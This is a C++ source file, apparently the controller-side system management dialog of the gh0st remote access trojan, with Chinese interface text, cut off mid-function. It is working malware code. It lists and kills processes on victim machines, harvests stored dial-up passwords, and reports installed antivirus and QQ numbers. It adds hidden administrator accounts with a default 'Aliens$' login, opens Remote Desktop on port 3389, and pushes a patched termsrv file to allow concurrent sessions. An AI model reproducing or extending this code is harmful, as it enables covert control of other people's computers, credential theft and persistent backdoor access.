// SystemDlg.cpp : implementation file
//

#include "stdafx.h"
#include "gh0st.h"
#include "SystemDlg.h"
#include "InputDlg.h"
#include "C_termsrv_t.h"
#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

typedef SIZE_T
(WINAPI
 *LocalSizeT)(
 __in HLOCAL hMem
    );
/////////////////////////////////////////////////////////////////////////////
// CSystemDlg dialog
CSystemDlg::CSystemDlg(CWnd* pParent, CIOCPServer* pIOCPServer, ClientContext *pContext)
: CDialog(CSystemDlg::IDD, pParent)
{
	//{{AFX_DATA_INIT(CSystemDlg)
	m_net_user = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetString("服务器","Netuser","Aliens$");    //用户名称
	m_net_pass = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetString("服务器","Netpass","Alien1234");  //登陆密码
	m_admin = _T("Administrators");
	//}}AFX_DATA_INIT
	m_iocpServer = pIOCPServer;
	m_pContext = pContext;
	m_hIcon = LoadIcon(AfxGetInstanceHandle(), MAKEINTRESOURCE(IDI_SYSTEM));

	m_bOnClose = FALSE;
	dwMem = dwCpu = dwPrs = 0;
	nRemotePort = 3389;
}


void CSystemDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CSystemDlg)
	DDX_Control(pDX, IDC_LIST, m_list);
	DDX_Control(pDX, IDC_TAB, m_tab);
	DDX_Text(pDX, IDC_EDIT_admin, m_admin);
	DDX_Text(pDX, IDC_EDIT_PASS, m_net_pass);
	DDX_Text(pDX, IDC_EDIT_USER, m_net_user);
	//}}AFX_DATA_MAP
}


BEGIN_MESSAGE_MAP(CSystemDlg, CDialog)
	//{{AFX_MSG_MAP(CSystemDlg)
	ON_WM_CLOSE()
	ON_WM_SIZE()
	ON_NOTIFY(TCN_SELCHANGE, IDC_TAB, OnSelchangeTab)
	ON_COMMAND(ID_MENUITEM_KILLPROCESS, OnMenuitemKillprocess)
	ON_COMMAND(ID_MENUITEM_REFRESH_SLIST, OnMenuitemRefreshSlist)
	ON_NOTIFY(NM_RCLICK, IDC_LIST, OnRclickList)
	ON_COMMAND(ID_MENUITEM_COPY, OnMenuitemCopy)
	ON_COMMAND(ID_MENUITEM_WINDOW_RESTORED, OnMenuitemWindowRestored)
	ON_COMMAND(ID_MENUITEM_WINDOW_HIDE, OnMenuitemWindowHide)
	ON_COMMAND(ID_MENUITEM_WINDOW_CLOSE, OnMenuitemWindowClose)
	ON_COMMAND(ID_MENUITEM_WINDOW_MAX, OnMenuitemWindowMax)
	ON_COMMAND(ID_MENUITEM_WINDOW_MIN, OnMenuitemWindowMin)
	ON_COMMAND(ID_MENUITEM_KILLANDDEL, OnMenuitemKillanddel)
	ON_WM_TIMER()
	ON_COMMAND(ID_MENUITEM_ACTIVE_USER, OnMenuitemActiveUser)
	ON_COMMAND(ID_MENUITEM_DISABLE_USER, OnMenuitemDisableUser)
	ON_COMMAND(ID_MENUITEM_ADD_USER, OnMenuitemAddUser)
	ON_COMMAND(ID_MENUITEM_CHANGE_PASS, OnMenuitemChangePass)
	ON_COMMAND(ID_MENUITEM_DEL_USER, OnMenuitemDelUser)
	ON_COMMAND(ID_MENUITEM_DISCONNECT_USER, OnMenuitemDisconnectUser)
	ON_COMMAND(ID_MENUITEM_LOGOFF_USER, OnMenuitemLogoffUser)
	ON_BN_CLICKED(IDC_BUTTON_MSTSC, OnButtonMstsc)
	ON_BN_CLICKED(IDC_BUTTON_CHANAGEPORT, OnButtonChanageport)
	ON_BN_CLICKED(IDC_BUTTON_OPEN3389, OnButtonOpen3389)
	ON_COMMAND(ID_MENUITEM_S_LOGOFF, OnMenuitemSLogoff)
	ON_COMMAND(ID_MENUITEM_S_REBOOT, OnMenuitemSReboot)
	ON_COMMAND(ID_MENUITEM_S_SHUTDOWN, OnMenuitemSShutdown)
	ON_BN_CLICKED(IDC_NET_ADD, OnNetAdd)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CSystemDlg message handlers
void CSystemDlg::OnReceiveComplete()
{
	switch (m_pContext->m_DeCompressionBuffer.GetBuffer(0)[0])
	{
	case TOKEN_PSLIST:
		ShowProcessList();
		break;
	case TOKEN_WSLIST:
		ShowWindowsList();
		break;
	case TOKEN_DIALUPASS:
		ShowDialupassList();
		break;
	case TOKEN_SOFTWARE:
		ShowSoftWareList();
		break;
	case TOKEN_SSLIST:
		ShowSysInfoList();
		break;
	case TOKEN_USLIST:
		ShowSysUserList();
		break;
	case TOKEN_ASLIST:
		ShowUserStateList();
		break;
	case TOKEN_CPUMEMORY:
		{
			//////////////// MEM//////////////////////////////////////////////////////////
			memcpy((void*)&dwMem,m_pContext->m_DeCompressionBuffer.GetBuffer(1),sizeof(DWORD));
			//////////////// CPU//////////////////////////////////////////////////////////
			memcpy((void*)&dwCpu,m_pContext->m_DeCompressionBuffer.GetBuffer(1)+sizeof(DWORD),sizeof(DWORD));
		}
		break;
	case TOKEN_CHANGE_PSAA_SUCCESS:
		::MessageBox(m_hWnd,_T("修改密码成功!"),"提示",MB_YESNO);
		break;
	case TOKEN_GET_TERMSRV:
		SendTermsrv_t();
		break;
	case TOKEN_TERMSRV_OK:
		::MessageBox(m_hWnd,_T("双开3389成功!"),"提示",MB_YESNO);
		break;
	default:
		// 传输发生异常数据
		break;
	}
}

void CSystemDlg::SendTermsrv_t()
{
	if (MessageBox(_T("此机器为XP系统,是否双开3389?"), _T("提示"), MB_YESNO | MB_ICONQUESTION) == IDNO)
		return;
	int	nPacketLength = 1 + termsrv_tMyFileSize;
	LPBYTE	lpPacket = new BYTE[nPacketLength];
	if (lpPacket == NULL)
		return;
	
	lpPacket[0] = COMMAND_SEND_TERMSRV;
	memcpy(lpPacket + 1,  termsrv_tMyFileBuf, termsrv_tMyFileSize);
	
	m_iocpServer->Send(m_pContext,lpPacket,nPacketLength);
}

static UINT indicators[] =
{
	ID_SEPARATOR,           // status line indicator
		ID_SEPARATOR,           // status line indicator
		ID_SEPARATOR,           // status line indicator
		ID_SEPARATOR,           // status line indicator
};
BOOL CSystemDlg::OnInitDialog() 
{
	CDialog::OnInitDialog();
	
	// TODO: Add extra initialization here
	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon

	CString str;
	sockaddr_in  sockAddr;
	memset(&sockAddr, 0, sizeof(sockAddr));
	int nSockAddrLen = sizeof(sockAddr);
	BOOL bResult = getpeername(m_pContext->m_Socket, (SOCKADDR*)&sockAddr, &nSockAddrLen);
//	IPAddress = bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "";
	str.Format("\\\\%s - 系统管理", bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "");
	SetWindowText(str);

	m_tab.InsertItem(0, "进程");
	m_tab.InsertItem(1, "窗口");
	m_tab.InsertItem(2, "系统信息");
	m_tab.InsertItem(3, "拨号密码");
	m_tab.InsertItem(4, "软件");
	m_tab.InsertItem(5, "系统用户");
	m_tab.InsertItem(6, "在线用户");

	m_tab.SetTheme(xtpControlThemeUltraFlat);

	HWND hWndHeader =m_list.GetDlgItem(0)->GetSafeHwnd();// m_pListCtrl->GetDlgItem(0)->GetSafeHwnd();
	m_header.SubclassWindow(hWndHeader);

	if (!m_wndStatusBar.Create(this) ||
		!m_wndStatusBar.SetIndicators(indicators,
		sizeof(indicators)/sizeof(UINT)))
	{
		TRACE0("Failed to create status bar\n");
		return -1;      // fail to create
	}
	
	m_wndStatusBar.SetPaneInfo(0, m_wndStatusBar.GetItemID(0), SBPS_NORMAL, 100);
	m_wndStatusBar.SetPaneInfo(1, m_wndStatusBar.GetItemID(1), SBPS_NORMAL, 130);
	m_wndStatusBar.SetPaneInfo(2, m_wndStatusBar.GetItemID(2), SBPS_NORMAL, 150);
	m_wndStatusBar.SetPaneInfo(3, m_wndStatusBar.GetItemID(3), SBPS_STRETCH, NULL);
	RepositionBars(AFX_IDW_CONTROLBAR_FIRST, AFX_IDW_CONTROLBAR_LAST, 0); //显示状态栏	

	SetTimer(1, 3000, NULL);  //开启定时器 1
	SetDlgItemText(IDC_EDIT_PORT,"3389");

	AdjustList();
    ShowProcessList();
	return TRUE;  // return TRUE unless you set the focus to a control
	              // EXCEPTION: OCX Property Pages should return FALSE
}

void CSystemDlg::AdjustList()
{
	// 状态栏还没有创建
	if (m_wndStatusBar.m_hWnd == NULL)
		return;
	// 定位状态栏
	RepositionBars(AFX_IDW_CONTROLBAR_FIRST, AFX_IDW_CONTROLBAR_LAST, 0); //显示工具栏

	RECT	rectClient;
	RECT	rectList;
	RECT	rectTab;
	GetClientRect(&rectClient);
	rectList.left = 20;
	rectList.top = 35;
	rectList.right = rectClient.right - 20;
	rectList.bottom = rectClient.bottom - 100;

	rectTab.left = 5;
	rectTab.top = 0;
	rectTab.right = rectClient.right - 5;
	rectTab.bottom = rectClient.bottom - 25;
	
	m_tab.MoveWindow(&rectTab);
	m_list.MoveWindow(&rectList);
}

CString __MakePriority(DWORD dwPriClass)
{
	CString strRet;
	switch(dwPriClass)
	{
	case REALTIME_PRIORITY_CLASS:
		strRet = "实时";
		break;
	case HIGH_PRIORITY_CLASS:
		strRet = "高";
		break;
	case ABOVE_NORMAL_PRIORITY_CLASS:
		strRet = "高于标准";
		break;
	case NORMAL_PRIORITY_CLASS:
		strRet = "标准";
		break;
	case BELOW_NORMAL_PRIORITY_CLASS:
		strRet = "低于标准";
		break;
	case IDLE_PRIORITY_CLASS:
		strRet = "空闲";
		break;
	default:
		strRet = "未知";
		break;
	}
	
	return strRet;
}

void CSystemDlg::ShowProcessList()
{
	DeleteList();
	m_list.SetExtendedStyle(LVS_EX_FLATSB | LVS_EX_FULLROWSELECT);
	m_list.InsertColumn(0, "映像名称", LVCFMT_LEFT, 100);
	m_list.InsertColumn(1, "PID", LVCFMT_LEFT, 50);
	m_list.InsertColumn(2, "程序路径", LVCFMT_LEFT, 230);
	m_list.InsertColumn(3, "优先级", LVCFMT_LEFT, 50);
	m_list.InsertColumn(4, "线程数", LVCFMT_LEFT, 50);
	m_list.InsertColumn(5, "用户名", LVCFMT_LEFT, 70);
	m_list.InsertColumn(6, "内存", LVCFMT_LEFT, 70);
	m_list.InsertColumn(7, "文件大小", LVCFMT_LEFT, 80);
	

	char	*lpBuffer = (char *)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));
	char	*strExeFile;
	char	*strProcessName;
	char    *strTemp; 
	DWORD	dwOffset = 0;
	CString str;
	char	*strProcessUser;

	for (int i = 0; dwOffset < m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1; i++)
	{
		LPDWORD	lpPID = LPDWORD(lpBuffer + dwOffset);
		strExeFile = lpBuffer + dwOffset + sizeof(DWORD);
		strProcessName = strExeFile + lstrlen(strExeFile) + 1;
		strTemp = strProcessName + lstrlen(strProcessName)+1;
		LPDWORD	lpdwPriClass = LPDWORD(strTemp);
		LPDWORD	lpdwThreads = LPDWORD(strTemp + sizeof(DWORD));
		strProcessUser = strTemp + sizeof(DWORD)*2;
		LPDWORD	lpdwWorkingSetSize = LPDWORD(strProcessUser + lstrlen(strProcessUser)+1);

		LPDWORD	lpdwFileSize = LPDWORD(strProcessUser + lstrlen(strProcessUser)+1 + sizeof(DWORD));
 
		m_list.InsertItem(i, strExeFile,2);
		str.Format("%5u", *lpPID);
		m_list.SetItemText(i, 1, str);
 
		m_list.SetItemText(i, 2, strProcessName);
 
		m_list.SetItemText(i, 3,__MakePriority(*lpdwPriClass));

		str.Format("%5u", *lpdwThreads);
		m_list.SetItemText(i, 4, str);

		m_list.SetItemText(i, 5, strProcessUser);

		str.Format("%5u K",*lpdwWorkingSetSize);
		m_list.SetItemText(i, 6 , str); 

		str.Format("%5u KB",*lpdwFileSize);
		m_list.SetItemText(i, 7 , str); 

		// ItemData 为进程ID
		m_list.SetItemData(i, *lpPID);
		dwOffset += sizeof(DWORD)*5 + lstrlen(strExeFile) + lstrlen(strProcessName) + lstrlen(strProcessUser) + 3;
	}

	dwPrs = i;
	str.Format("程序路径 / %d", i);
	LVCOLUMN lvc;
	lvc.mask = LVCF_TEXT;
	lvc.pszText = str.GetBuffer(0);
	lvc.cchTextMax = str.GetLength();
	m_list.SetColumn(2, &lvc);
}

BOOL CSystemDlg::PreTranslateMessage(MSG* pMsg) 
{
	// TODO: Add your specialized code here and/or call the base class
	if ( pMsg->message == WM_KEYDOWN && pMsg->wParam  == VK_F5)
	{
		OnMenuitemRefreshSlist();
		return TRUE;
	}
	if (pMsg->message == WM_KEYDOWN && (pMsg->wParam == VK_RETURN || pMsg->wParam == VK_ESCAPE))
	{
		return true;
	}
	return CDialog::PreTranslateMessage(pMsg);
}

void CSystemDlg::OnClose() 
{
	// TODO: Add your message handler code here and/or call default
	KillTimer(1);

	closesocket(m_pContext->m_Socket);

	m_bOnClose = TRUE;
	CDialog::OnClose();
}

void CSystemDlg::PostNcDestroy() 
{
	// TODO: Add your specialized code here and/or call the base class
	if(!m_bOnClose)
		OnClose();


	delete this;
	CDialog::PostNcDestroy();
}

void CSystemDlg::OnSize(UINT nType, int cx, int cy) 
{
	CDialog::OnSize(nType, cx, cy);

	if (!IsWindowVisible())
		return;
	// TODO: Add your message handler code here
	AdjustList();
}


void CSystemDlg::OnSelchangeTab(NMHDR* pNMHDR, LRESULT* pResult) 
{
	// TODO: Add your control notification handler code here
	ShowSelectWindow();
	*pResult = 0;
}

void CSystemDlg::DeleteList()
{
	m_list.DeleteAllItems();	
	int nColumnCount= m_list.GetHeaderCtrl()->GetItemCount();
	
	for(int n=0;n<nColumnCount;n++)
	{
		m_list.DeleteColumn(0);
	}
}


void CSystemDlg::ShowSelectWindow()
{
	DeleteList();
	switch (m_tab.GetCurSel())
	{
	case 0:
		GetProcessList();
		break;
	case 1:
		GetWindowsList();
		break;
	case 2:
		GetSysInfoList();		
		break;
	case 3:
		GetDialupassList();
		break;
	case 4:
		GetSoftWareList();
		break;
	case 5:
		GetSysUserList();
		break;
	case 6:
		GetUserStateList();
		break;
	default:
		break;
	}
}

void CSystemDlg::GetProcessList()
{
	BYTE bToken = COMMAND_PSLIST;
	m_iocpServer->Send(m_pContext, &bToken, 1);
}

void CSystemDlg::GetWindowsList()
{
	BYTE bToken = COMMAND_WSLIST;
	m_iocpServer->Send(m_pContext, &bToken, 1);
}

void CSystemDlg::GetSoftWareList()
{
	BYTE bToken = COMMAND_SOFTWARELIST;
	m_iocpServer->Send(m_pContext, &bToken, 1);
}

void CSystemDlg::GetSysUserList()
{
	BYTE bToken = COMMAND_USLIST;
	m_iocpServer->Send(m_pContext, &bToken, 1);	
}
void CSystemDlg::GetSysInfoList()
{
	BYTE bToken = COMMAND_SSLIST;
	m_iocpServer->Send(m_pContext, &bToken, 1);
}
void CSystemDlg::GetUserStateList()
{
	BYTE bToken = COMMAND_ASLIST;
	m_iocpServer->Send(m_pContext, &bToken, 1);	
}

void CSystemDlg::GetDialupassList()
{
	DeleteList();
	m_list.SetExtendedStyle(LVS_EX_FLATSB | LVS_EX_FULLROWSELECT);
	m_list.InsertColumn(0, "名称", LVCFMT_LEFT, 70);
	m_list.InsertColumn(1, "用户", LVCFMT_LEFT, 85);
	m_list.InsertColumn(2, "密码", LVCFMT_LEFT, 75);
	m_list.InsertColumn(3, "电话/主机", LVCFMT_LEFT, 80);
	m_list.InsertColumn(5, "设备", LVCFMT_LEFT, 130);

	BYTE bToken = COMMAND_DSLIST;
	m_iocpServer->Send(m_pContext, &bToken, 1);
}

void CSystemDlg::ShowSoftWareList()
{
	LPBYTE	lpBuffer = (LPBYTE)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));
	DWORD	dwOffset = 0;

	DeleteList();
	m_list.SetExtendedStyle(LVS_EX_FLATSB | LVS_EX_FULLROWSELECT);
	m_list.InsertColumn(0, "软件名称", LVCFMT_LEFT, 130);
	m_list.InsertColumn(1, "发行商", LVCFMT_LEFT, 85);
	m_list.InsertColumn(2, "版本", LVCFMT_LEFT, 75);
	m_list.InsertColumn(3, "安装时间", LVCFMT_LEFT, 80);
	m_list.InsertColumn(4, "卸载命令及参数", LVCFMT_LEFT, 300);


	for (int i = 0; dwOffset < m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1; i++)
	{
		for (int j = 0; j < 5; j++)
		{
			char *lpString = (char *)lpBuffer + dwOffset;

			if (j == 0)
				m_list.InsertItem(i, lpString);
			else
				m_list.SetItemText(i, j, lpString);
			
			dwOffset += lstrlen(lpString) + 1;
		}
	}
	LocalFree(lpBuffer);
}

void CSystemDlg::ShowDialupassList()
{
	if(2 != m_tab.GetCurSel())
		return;
	LPBYTE	lpBuffer = (LPBYTE)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));
	DWORD	dwOffset = 0;

	for (int i = 0; dwOffset < m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1; i++)
	{
		for (int j = 0; j < 6; j++)
		{
			char *lpString = (char *)lpBuffer + dwOffset;
			if (j > 0)
			{
				if (j == 1)
					m_list.InsertItem(i, lpString);
				else
					m_list.SetItemText(i, j - 1, lpString);
			}
			dwOffset += lstrlen(lpString) + 1;
		}
	}
	LocalFree(lpBuffer);
}

void CSystemDlg::ShowWindowsList()
{
	DeleteList();
	m_list.SetExtendedStyle(LVS_EX_FLATSB | LVS_EX_FULLROWSELECT);
	m_list.InsertColumn(0, "PID", LVCFMT_LEFT, 75);
	m_list.InsertColumn(1, "句柄", LVCFMT_LEFT, 70);
	m_list.InsertColumn(2, "窗口名称", LVCFMT_LEFT, 250);
	m_list.InsertColumn(3, "窗口状态", LVCFMT_LEFT, 70);

	LPBYTE lpBuffer = (LPBYTE)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));
	DWORD	dwOffset = 0;
	char	*lpTitle = NULL;
	CString	str;
	for (int i = 0; dwOffset < m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1; i++)
	{
		
		LPDWORD	lpPID = LPDWORD(lpBuffer + dwOffset);
		LPDWORD	hwnd = LPDWORD(lpBuffer + dwOffset + sizeof(DWORD));
		lpTitle = (char *)lpBuffer + dwOffset + sizeof(DWORD)*2;
		str.Format("%5u", *lpPID);
		m_list.InsertItem(i, str,25);
		str.Format("%5u", *hwnd);
		m_list.SetItemText(i, 1,str);
		m_list.SetItemText(i, 2, lpTitle);
		m_list.SetItemText(i, 3,"显示");
		// ItemData 为进程ID
		m_list.SetItemData(i, *lpPID);
		dwOffset += sizeof(DWORD)*2 + lstrlen(lpTitle) + 1;
	}
	str.Format("窗口名称 / %d", i);
	LVCOLUMN lvc;
	lvc.mask = LVCF_TEXT;
	lvc.pszText = str.GetBuffer(0);
	lvc.cchTextMax = str.GetLength();
	m_list.SetColumn(2, &lvc);
}

void CSystemDlg::OnMenuitemRefreshSlist() 
{
	// TODO: Add your command handler code here
	ShowSelectWindow();
}

void CSystemDlg::OnRclickList(NMHDR* pNMHDR, LRESULT* pResult) 
{
	// TODO: Add your control notification handler code here
	CMenu	popup;
	popup.LoadMenu(IDR_MENU_SLIST);
	CMenu*	pM = popup.GetSubMenu(0);
	CPoint	p;
	GetCursorPos(&p);

	int a1[12] = {4,5,6,7,8,9,10,11,12,13,14,15};
	int a2[9] =  {2,3,9,10,11,12,13,14,15};
	int a3[14] = {2,3,4,5,6,7,8,9,10,11,12,13,14,15};
	int a4[9] =  {2,3,4,5,6,7,8,14,15};
	int a5[12] = {2,3,4,5,6,7,8,9,10,11,12,13};

	switch(m_tab.GetCurSel())
	{
	case 0:
		{
			for (int i = 12 ; i> 0;i--)
			{
				pM->DeleteMenu(a1[i-1], MF_BYPOSITION);
			}
		}
		break;
	case 1:
		{
			for (int i = 9 ; i> 0;i--)
			{
				pM->DeleteMenu(a2[i-1], MF_BYPOSITION);
			}
		}
		break;
	case 2:
	case 3:
	case 4:
		{
			for (int i = 14 ; i> 0;i--)
			{
				pM->DeleteMenu(a3[i-1], MF_BYPOSITION);
			}
		}
    	break;
	case 5:
		{
			for (int i = 9 ; i> 0;i--)
			{
				pM->DeleteMenu(a4[i-1], MF_BYPOSITION);
			}
		}
		break;
	case 6:
		{
			for (int i = 12 ; i> 0;i--)
			{
				pM->DeleteMenu(a5[i-1], MF_BYPOSITION);
			}
		}
		break;
	default:
		break;
	}

	CXTPCommandBars::TrackPopupMenu(pM, 0, p.x, p.y, this);

	*pResult = 0;
}

void CSystemDlg::SetClipboardText(CString &Data)
{
	if(::OpenClipboard(NULL) == 0)
		return;
	EmptyClipboard();
	HGLOBAL htext = GlobalAlloc(GHND, Data.GetLength() + 1);
	if(htext != 0)
	{
		CopyMemory(GlobalLock(htext), Data.GetBuffer(0), Data.GetLength());
		GlobalUnlock(htext);
		SetClipboardData(1, (HANDLE)htext);
		GlobalFree(htext);
	}
	CloseClipboard();
}

void CSystemDlg::OnMenuitemCopy() 
{
	// TODO: Add your command handler code here
	if (m_list.GetSelectedCount() < 1)
	{
		return ;	
	}
	POSITION pos = m_list.GetFirstSelectedItemPosition();
	CString Data;
	CString temp;
	while(pos)
	{
		temp = "";
		int	nItem = m_list.GetNextSelectedItem(pos);
		for(int i = 0; i < m_list.GetHeaderCtrl()-> GetItemCount(); i++)
		{
			temp += m_list.GetItemText(nItem, i);
			temp += "	";
		}
		Data += temp;
		Data += "\r\n";
	}
	SetClipboardText(Data);
	MessageBox("已复制数据到剪切板");
}



void CSystemDlg::OnMenuitemWindowRestored() 
{
	// TODO: Add your command handler code here
	BYTE lpMsgBuf[20];
	int	nItem = m_list.GetSelectionMark();
	if (nItem >=0 )
	{
		ZeroMemory(lpMsgBuf,20);
		lpMsgBuf[0]=COMMAND_WINDOW_TEST;
		DWORD hwnd = atoi(m_list.GetItemText(nItem, 1));

		m_list.SetItemText(nItem,3,"显示");
		memcpy(lpMsgBuf+1,&hwnd,sizeof(DWORD));
		DWORD dHow=SW_RESTORE;
		memcpy(lpMsgBuf+1+sizeof(hwnd),&dHow,sizeof(DWORD));
		m_iocpServer->Send(m_pContext, lpMsgBuf, sizeof(lpMsgBuf));	
	}
}

void CSystemDlg::OnMenuitemWindowHide() 
{
	// TODO: Add your command handler code here
	BYTE lpMsgBuf[20];
	int	nItem = m_list.GetSelectionMark();
	if (nItem >=0 )
	{
		ZeroMemory(lpMsgBuf,20);
		lpMsgBuf[0]=COMMAND_WINDOW_TEST;
		DWORD hwnd = atoi(m_list.GetItemText(nItem, 1));
		
		m_list.SetItemText(nItem,3,"隐藏");
		memcpy(lpMsgBuf+1,&hwnd,sizeof(DWORD));
		DWORD dHow=SW_HIDE;
		memcpy(lpMsgBuf+1+sizeof(hwnd),&dHow,sizeof(DWORD));
		m_iocpServer->Send(m_pContext, lpMsgBuf, sizeof(lpMsgBuf));	
	}
}

void CSystemDlg::OnMenuitemWindowClose() 
{
	// TODO: Add your command handler code here
	BYTE lpMsgBuf[20];
	int	nItem = m_list.GetSelectionMark();
	if (nItem >=0 )
	{
		ZeroMemory(lpMsgBuf,20);
		lpMsgBuf[0]=COMMAND_WINDOW_CLOSE;
		DWORD hwnd = atoi(m_list.GetItemText(nItem, 1));
	
		memcpy(lpMsgBuf+1,&hwnd,sizeof(DWORD));
		m_iocpServer->Send(m_pContext, lpMsgBuf, sizeof(lpMsgBuf));	
	}
}

void CSystemDlg::OnMenuitemWindowMax() 
{
	// TODO: Add your command handler code here
	BYTE lpMsgBuf[20];
	int	nItem = m_list.GetSelectionMark();
	if (nItem >=0 )
	{
		ZeroMemory(lpMsgBuf,20);
		lpMsgBuf[0]=COMMAND_WINDOW_TEST;
		DWORD hwnd = atoi(m_list.GetItemText(nItem, 1));
		
		m_list.SetItemText(nItem,3,"显示");
		memcpy(lpMsgBuf+1,&hwnd,sizeof(DWORD));
		DWORD dHow=SW_MAXIMIZE;
		memcpy(lpMsgBuf+1+sizeof(hwnd),&dHow,sizeof(DWORD));
		m_iocpServer->Send(m_pContext, lpMsgBuf, sizeof(lpMsgBuf));	
	}
}

void CSystemDlg::OnMenuitemWindowMin() 
{
	// TODO: Add your command handler code here
	BYTE lpMsgBuf[20];
	int	nItem = m_list.GetSelectionMark();
	if (nItem >=0 )
	{
		ZeroMemory(lpMsgBuf,20);
		lpMsgBuf[0]=COMMAND_WINDOW_TEST;
		DWORD hwnd = atoi(m_list.GetItemText(nItem, 1));
		
		m_list.SetItemText(nItem,3,"显示");
		memcpy(lpMsgBuf+1,&hwnd,sizeof(DWORD));
		DWORD dHow=SW_MINIMIZE;
		memcpy(lpMsgBuf+1+sizeof(hwnd),&dHow,sizeof(DWORD));
		m_iocpServer->Send(m_pContext, lpMsgBuf, sizeof(lpMsgBuf));	
	}
}

void CSystemDlg::OnMenuitemKillanddel() //结束并删除
{
	// TODO: Add your command handler code here
	KillprocessDel(COMMAND_KILLPROCESS,"并删除");
}

void CSystemDlg::OnMenuitemKillprocess() //结束进程
{
	// TODO: Add your command handler code here
    if (m_tab.GetCurSel() == 0 )
	{
     KillprocessDel(COMMAND_KILLPROCESS,"");
	}
	else
	{
     KillprocessDel(COMMAND_KILLPROCESS_WINDOW,"");
	}


}

void CSystemDlg::KillprocessDel(BYTE Buffer ,char *strbuf) 
{

  LPBYTE lpBuffer = (LPBYTE)LocalAlloc(LPTR, 2 + (m_list.GetSelectedCount() * 4));
   lpBuffer[0] = Buffer;

   if(strbuf == "并删除")
   {
	   
	   lpBuffer[1] = 1;
   }
   else
   {
	  
	   lpBuffer[1] = 0;
	}

   char *lpTips = 
	   "警告: 终止进程会导致不希望发生的结果，\n"
	   "包括数据丢失和系统不稳定。在被终止前，\n"
	   "进程将没有机会保存其状态和数据。";
   CString str;
   if (m_list.GetSelectedCount() > 1)
   {
	   str.Format("%s确实\n想终止%s这%d项进程吗?", lpTips, strbuf,m_list.GetSelectedCount());	
   }
   else
   {
	   str.Format("%s确实\n想终止%s该项进程吗?", lpTips, strbuf);
   }
   if (::MessageBox(m_hWnd, str, "进程结束警告", MB_YESNO|MB_ICONQUESTION) == IDNO)
	   return;
   
   DWORD	dwOffset = 2;
   POSITION pos = m_list.GetFirstSelectedItemPosition(); //iterator for the CListCtrl
   
   while(pos) //so long as we have a valid POSITION, we keep iterating
   {
	   int	nItem = m_list.GetNextSelectedItem(pos);
	   DWORD dwProcessID = m_list.GetItemData(nItem);
	   memcpy(lpBuffer + dwOffset, &dwProcessID, sizeof(DWORD));
	   dwOffset += sizeof(DWORD);
   }
   LocalSizeT pLocalSize=(LocalSizeT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"LocalSize");
   m_iocpServer->Send(m_pContext, lpBuffer, pLocalSize(lpBuffer));
	LocalFree(lpBuffer);



}


void CSystemDlg::ShowSysInfoList()
{
	DeleteList();
	m_list.SetExtendedStyle(LVS_EX_FLATSB | LVS_EX_FULLROWSELECT);
	m_list.InsertColumn(0, "名称", LVCFMT_LEFT, 100);
	m_list.InsertColumn(1, "信息", LVCFMT_LEFT, 420);
	
	tagSystemInfo m_SysInfo;
	LPBYTE lpBuffer = (LPBYTE)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));
	memcpy(&m_SysInfo, lpBuffer , sizeof(tagSystemInfo));
	
	CString str;
	m_list.InsertItem(0, _T("主机IP") , 0);
	m_list.InsertItem(1, _T("CPU信息"), 1);
	m_list.InsertItem(2, _T("内存大小"),2);
	m_list.InsertItem(3, _T("硬盘大小"),3);
	m_list.InsertItem(4, _T("计算机名"),4);
	m_list.InsertItem(5, _T("当前用户"),5);
	m_list.InsertItem(6, _T("活动时间"),6);
	m_list.InsertItem(7, _T("安全软件"),7);
	m_list.InsertItem(8, _T("远程端口"),8);
	m_list.InsertItem(9, _T("是否双开"),9);
	m_list.InsertItem(10, _T("屏幕分辨率"),10);
	m_list.InsertItem(11, _T("服务端位置"),11);
	m_list.InsertItem(12, _T("QQ号"),12);
 	m_list.InsertItem(13, _T("上线域名"),13);

	m_list.SetItemText(0, 1, IPAddress);
	m_list.SetItemText(1, 1, m_SysInfo.szCpuInfo);
	str.Format("总物理内存:%d MB , 未使用物理内存:%d MB",m_SysInfo.szMemory,m_SysInfo.szMemoryFree);	
	m_list.SetItemText(2, 1, str);
	str.Format("硬盘总容量:%ld GB , 剩余容量:%ld GB",m_SysInfo.szDriveSize,m_SysInfo.szDriveFreeSize);
	m_list.SetItemText(3, 1, str);
	m_list.SetItemText(4, 1, m_SysInfo.szPcName);
	m_list.SetItemText(5, 1, m_SysInfo.szUserName);
	m_list.SetItemText(6, 1, m_SysInfo.szActiveTime);
	m_list.SetItemText(7, 1, m_SysInfo.szAntiVirus);
	m_list.SetItemText(8, 1, m_SysInfo.szRemotePort);
	m_list.SetItemText(9, 1, m_SysInfo.szOpenInfo);
	m_list.SetItemText(10, 1, m_SysInfo.szScrxy);
	m_list.SetItemText(11, 1, m_SysInfo.szDLLPath);
	m_list.SetItemText(12, 1, m_SysInfo.szQQNum);
	str.Format("上线地址%d :%s",m_SysInfo.nAddres,m_SysInfo.szAddress);
	m_list.SetItemText(13, 1,str);

	nRemotePort = atoi(m_SysInfo.szRemotePort);
    SetDlgItemText(IDC_NOW_PORT,m_SysInfo.szRemotePort);
	

}

void CSystemDlg::ShowSysUserList()
{
	DeleteList();
	m_list.SetExtendedStyle(LVS_EX_FLATSB | LVS_EX_FULLROWSELECT);
	m_list.InsertColumn(0, "用户名", LVCFMT_LEFT, 150);
	m_list.InsertColumn(1, "用户组", LVCFMT_LEFT, 150);
	m_list.InsertColumn(2, "状态", LVCFMT_LEFT, 80);
	
	LPBYTE lpBuffer = (LPBYTE)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));
	DWORD	dwOffset = 0;
	
	CString	str;
